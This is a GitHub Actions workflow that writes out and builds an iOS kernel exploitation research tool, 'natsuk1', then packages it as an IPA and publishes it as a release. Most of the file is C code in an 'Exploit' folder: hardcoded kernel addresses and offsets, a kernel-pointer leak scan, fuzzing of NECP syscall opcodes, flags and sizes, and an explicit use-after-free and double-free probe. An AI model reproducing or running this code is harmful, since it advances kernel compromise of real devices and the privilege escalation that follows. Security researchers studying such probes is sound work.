name: Fix and Release

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  build:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Cleanup
        run: |
          rm -f .github/workflows/build_and_release.yml
          rm -f .github/workflows/fix_and_test.yml
          rm -f natsuk1/Views/SimpleList.swift

      - name: Write nk_offsets.h
        run: |
          cat > natsuk1/Exploit/nk_offsets.h <<'NK_EOF'
          #ifndef NK_OFFSETS_H
          #define NK_OFFSETS_H
          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
          #define NK_SYSENT_BASE                0xFFFFFFF007C192A0ULL
          #define NK_SYSENT_COUNT               558
          #define NK_SLIDE_FALLBACK             0x3D00000ULL
          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
          #define NK_NECP_GET_TLV_AT_OFFSET     0xFFFFFFF00A4C2034ULL
          #define NK_NECP_OP_ADD_CLIENT         0x01
          #define NK_NECP_OP_REMOVE_CLIENT      0x02
          #define NK_NECP_OP_COPY_RESULT        0x03
          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
          #define NK_NECP_OP_COPY_LIST          0x05
          #define NK_NECP_OP_REQUEST_NEXUS      0x06
          #define NK_NECP_OP_AGENT_ACTION       0x07
          #define NK_NECP_OP_COPY_AGENT         0x08
          #define NK_NECP_OP_COPY_INTERFACE     0x09
          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
          #define NK_NECP_OP_UPDATE_CACHE       0x0E
          #define NK_NECP_OP_COPY_UPDATE        0x0F
          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
          #define NK_NECP_OP_ADD_FLOW           0x11
          #define NK_NECP_OP_REMOVE_FLOW        0x12
          #define NK_NECP_OP_CLAIM              0x13
          #define NK_NECP_OP_SIGN               0x14
          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
          #define NK_NECP_OP_VALIDATE           0x17
          #define NK_NECP_OP_GET_SIGNED_ID      0x18
          #define NK_NECP_OP_SET_SIGNED_ID      0x19
          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
          #define NK_NECP_OP_GET_FLOW_STATS     0x1B
          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL
          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL
          #define NK_ARENA_SIZE                 0x4000ULL
          #define NK_FLOW_OFF_NEXT              0x30
          #define NK_FLOW_OFF_LEN               0x68
          #define NK_FLOW_OFF_INLINE            0x70
          #define NK_FLOW_OFF_LIST_NEXT         0x38
          #define NK_FLOW_OFF_LIST_PREV         0x40
          #define NK_FLOW_OFF_FLAGS             0x74
          #define NK_FLOW_OFF_PARENT            0x88
          #define NK_FLOW_OFF_RULES             0x90
          #define NK_FLOW_OFF_IFACE_COUNT       0x538
          #define NK_FLOW_OFF_PARAMS_LEN        0x5a0
          #define NK_FLOW_OFF_PARAMS_PTR        0x5a8
          #endif
          NK_EOF

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP_EOF'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>
          #include <mach/vm_region.h>
          #include "nk_api.h"
          #include "nk_offsets.h"
          extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t*);
          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define RESBUF 65536
          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;
          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
          #define LR(t, ...) lg(t, "> ", __VA_ARGS__)
          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, 0x01, uuid, (size_t)16, p, (size_t)1);
          }
          static int nadd_flow_ex(int fd, const uint8_t cu[16], uint8_t fu[16], uint16_t flag, size_t sz) {
              static uint8_t req[512];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = flag;
              if (sz < 0x24) sz = 0x24;
              if (sz > sizeof(req)) sz = sizeof(req);
              int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11,
                                   (void*)cu, (size_t)16, req, sz);
              if (r == 0 && fu) {
                  memcpy(fu, req, 16);
                  fu[9] |= 0x01;
              }
              return r;
          }
          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              return nadd_flow_ex(fd, cu, fu, 0x0040, 56);
          }
          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, 0x12,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }
          static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
              if (len > max) len = max;
              for (int i = 0; i < len; i += 16) {
                  char hex[96];
                  snprintf(hex, sizeof(hex), "%04x: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
                      i, buf[i+0], buf[i+1], buf[i+2], buf[i+3], buf[i+4], buf[i+5], buf[i+6], buf[i+7],
                      buf[i+8], buf[i+9], buf[i+10], buf[i+11], buf[i+12], buf[i+13], buf[i+14], buf[i+15]);
                  LI(tag, "%s", hex);
              }
          }
          static int scan_kptr(const char *tag, const uint8_t *buf, int len, int maxhits) {
              int found = 0;
              for (int i = 0; i + 8 <= len; i += 8) {
                  uint64_t v; memcpy(&v, buf + i, 8);
                  if (is_kptr(v)) {
                      LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v);
                      found++;
                      if (found >= maxhits) break;
                  }
              }
              return found;
          }
          static int step_arena_full(void) {
              nk_log("");
              LI("S1", "arena 16KB dump + kptr scan");
              int fd = nfd();
              if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              uint64_t uva = 0;
              int rc = (int)syscall(SYS_NECP_ACTION, fd, 0x0D, (void*)0, (size_t)0, (void*)&uva, (size_t)8);
              LI("S1", "uva=0x%llx", (unsigned long long)uva);
              close(fd);
              if (rc != 0) { LE("S1", "leak rc=%d", rc); return -1; }
              static uint8_t big[16384]; memset(big, 0, sizeof(big));
              mach_vm_size_t got = 0;
              kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), uva, sizeof(big),
                                                        (mach_vm_address_t)(uintptr_t)big, &got);
              LI("S1", "read kr=%d got=%llu", kr, (unsigned long long)got);
              if (kr == KERN_SUCCESS && got > 0) {
                  LI("S1", "first 256:");
                  hexdump("S1H", big, 256, 256);
                  LI("S1", "last 256:");
                  if (got > 256) hexdump("S1L", big + got - 256, 256, 256);
                  int nk = scan_kptr("S1K", big, (int)got, 32);
                  LI("S1", "kptr total = %d", nk);
                  int lastnz = 0;
                  for (int i = 0; i < (int)got; i++) if (big[i] != 0) lastnz = i;
                  LI("S1", "last nonzero off: 0x%x", lastnz);
              }
              return 0;
          }
          static int step_all_opcodes(void) {
              nk_log("");
              LI("S2", "enumerate opcodes 0x01..0x1B with fresh client each");
              for (uint32_t op = 0x01; op <= 0x1B; op++) {
                  int fd = nfd();
                  if (fd < 0) continue;
                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
                  nadd_client(fd, cu);
                  nadd_flow(fd, cu, fu);

                  uint8_t buf[512]; memset(buf, 0, sizeof(buf));
                  int c = (int)syscall(SYS_NECP_ACTION, fd, op,
                                       (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
                  LI("S2", "op=0x%02x ret=%d", op, c);
                  if (c > 0) {
                      hexdump("S2H", buf, c, 64);
                  }
                  close(fd);
              }
              return 0;
          }
          static int step_add_flow_flags(void) {
              nk_log("");
              LI("S3", "add_flow with various flags");
              uint16_t flags[] = {0x0001, 0x0002, 0x0004, 0x0008, 0x0010, 0x0020, 0x0040,
                                  0x0080, 0x0100, 0x0200, 0x0400, 0x0800, 0x1000, 0x2000,
                                  0x4000, 0x8000, 0xFFFF};
              for (size_t i = 0; i < sizeof(flags)/sizeof(flags[0]); i++) {
                  int fd = nfd();
                  if (fd < 0) continue;
                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
                  nadd_client(fd, cu);
                  int r = nadd_flow_ex(fd, cu, fu, flags[i], 56);
                  LI("S3", "flag=0x%04x add_flow ret=%d", flags[i], r);
                  if (r == 0) {
                      uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
                      int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                           (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
                      LI("S3", "  copy_result=%d", c);
                      if (c > 0) {
                          int nk = scan_kptr("S3K", buf, c, 4);
                          LI("S3", "  kptr=%d", nk);
                      }
                  }
                  close(fd);
              }
              return 0;
          }
          static int step_add_flow_sizes(void) {
              nk_log("");
              LI("S4", "add_flow size sweep");
              size_t sizes[] = {0x24, 0x30, 0x3c, 0x3d, 0x40, 0x60, 0x80, 0xc0, 0xe0, 0xf0, 0xf1, 0xf2};
              for (size_t i = 0; i < sizeof(sizes)/sizeof(sizes[0]); i++) {
                  int fd = nfd();
                  if (fd < 0) continue;
                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
                  nadd_client(fd, cu);
                  int r = nadd_flow_ex(fd, cu, fu, 0x0040, sizes[i]);
                  LI("S4", "size=0x%zx add_flow ret=%d", sizes[i], r);
                  if (r == 0) {
                      uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
                      int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                           (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
                      LI("S4", "  copy_result=%d", c);
                  }
                  close(fd);
              }
              return 0;
          }
          static int step_claim(void) {
              nk_log("");
              LI("S5", "op=0x13 claim - rebind client");
              int fdA = nfd();
              int fdB = nfd();
              if (fdA < 0 || fdB < 0) return -1;
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              nadd_client(fdA, cu);
              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
              nadd_flow(fdA, cu, fu);

              uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
              int c1 = (int)syscall(SYS_NECP_ACTION, fdA, 0x03,
                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
              LI("S5", "copy_result from A (before claim): %d", c1);

              int rc = (int)syscall(SYS_NECP_ACTION, fdB, 0x13,
                                    (void*)cu, (size_t)16, NULL, (size_t)0);
              LI("S5", "claim rc=%d", rc);

              memset(buf, 0, sizeof(buf));
              int c2 = (int)syscall(SYS_NECP_ACTION, fdB, 0x03,
                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
              LI("S5", "copy_result from B (after claim): %d", c2);
              if (c2 > 0) hexdump("S5H", buf, c2, 512);

              memset(buf, 0, sizeof(buf));
              int c3 = (int)syscall(SYS_NECP_ACTION, fdA, 0x03,
                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
              LI("S5", "copy_result from A (after claim): %d", c3);

              close(fdA);
              close(fdB);
              return 0;
          }
          static int step_uaf(void) {
              nk_log("");
              LI("S6", "UAF probe: remove_flow + copy_result");
              int fd = nfd();
              if (fd < 0) return -1;
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              nadd_client(fd, cu);
              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
              int rf = nadd_flow(fd, cu, fu);
              LI("S6", "add_flow=%d", rf);
              int r1 = nrm_flow(fd, fu);
              LI("S6", "remove#1=%d", r1);

              uint8_t buf[2048]; memset(buf, 0, sizeof(buf));
              int c1 = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
              LI("S6", "copy_result after free=%d", c1);
              if (c1 > 0) {
                  hexdump("S6H", buf, c1, 512);
                  int nk = scan_kptr("S6K", buf, c1, 8);
                  LI("S6", "  kptr=%d", nk);
              }

              int r2 = nrm_flow(fd, fu);
              LI("S6", "remove#2=%d", r2);

              int rf2 = nadd_flow(fd, cu, fu);
              LI("S6", "re-add=%d", rf2);
              memset(buf, 0, sizeof(buf));
              int c2 = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
              LI("S6", "copy_result re-add=%d", c2);
              if (c2 > 0) {
                  hexdump("S6R", buf, c2, 512);
                  int nk = scan_kptr("S6RK", buf, c2, 8);
                  LI("S6", "  kptr=%d", nk);
              }

              close(fd);
              return 0;
          }
          static int step_multi_flow(void) {
              nk_log("");
              LI("S7", "5 flows on one client");
              int fd = nfd();
              if (fd < 0) return -1;
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              nadd_client(fd, cu);
              for (int i = 0; i < 5; i++) {
                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
                  int r = nadd_flow(fd, cu, fu);
                  LI("S7", "flow#%d ret=%d", i, r);
              }
              uint8_t buf[8192]; memset(buf, 0, sizeof(buf));
              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                   (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
              LI("S7", "copy_result=%d", c);
              if (c > 0) {
                  hexdump("S7H", buf, c, 1024);
                  int nk = scan_kptr("S7K", buf, c, 16);
                  LI("S7", "kptr=%d", nk);
              }
              close(fd);
              return 0;
          }
          static int step_tlv_types(void) {
              nk_log("");
              LI("S8", "TLV types in add_flow");
              uint8_t types[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
                                 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0xda, 0xd4, 0xdb, 0xdc};
              for (size_t i = 0; i < sizeof(types); i++) {
                  int fd = nfd();
                  if (fd < 0) continue;
                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
                  nadd_client(fd, cu);

                  uint8_t req[80]; memset(req, 0, sizeof(req));
                  memcpy(req + 0x10, cu, 16);
                  *(uint16_t*)(req + 0x20) = 0x0040;
                  req[0x24] = types[i];
                  *(uint32_t*)(req + 0x25) = 0x08;
                  uint8_t fu[16];
                  int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11,
                                       (void*)cu, (size_t)16, req, (size_t)80);
                  LI("S8", "type=0x%02x add_flow ret=%d", types[i], r);
                  if (r == 0) {
                      uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
                      int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                           (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
                      LI("S8", "  copy_result=%d", c);
                  }
                  close(fd);
              }
              return 0;
          }
          static int impl(void) {
              nk_log("");
              nk_log("================================================================");
              nk_log("natsuk1 v6.0 - NECP EXHAUSTIVE RECON");
              nk_log("iOS 27.0 / iPhone14,5 / 24A437");
              nk_log("================================================================");
              nk_log("");
              int fd = nfd();
              if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("PRE", "necp_open OK");

              step_arena_full();
              step_all_opcodes();
              step_add_flow_flags();
              step_add_flow_sizes();
              step_claim();
              step_uaf();
              step_multi_flow();
              step_tlv_types();

              nk_log("");
              nk_log("======== done ========");
              return 0;
          }
          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) { nk_log("[!] already running"); return 1; }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          void nk_necp_cancel(void) { g_cancel = 1; nk_log("[!] cancel requested"); }
          NECP_EOF

      - name: Install tools
        run: |
          brew install xcodegen ldid || true
          brew link --overwrite xcodegen ldid || true

      - name: Generate project
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            SWIFT_APPROACHABLE_CONCURRENCY=NO \
            SWIFT_UPCOMING_FEATURE_NONISOLATED_NONSENDING_BY_DEFAULT=NO \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package and Release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          if [ -z "$APP_PATH" ]; then echo "no .app"; exit 1; fi
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then
            gh release delete development --yes --cleanup-tag
          fi
          REPO="${{ github.repository }}"
          IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
          NOTES="natsuk1 v6.0 exhaustive NECP recon

          IPA: ${IPA_URL}

          $(git log -5 --pretty=format:'- %h %s')"
          gh release create development natsuk1.ipa \
            --target "${{ github.sha }}" \
            --title "Development" --prerelease --latest=false \
            --notes "$NOTES"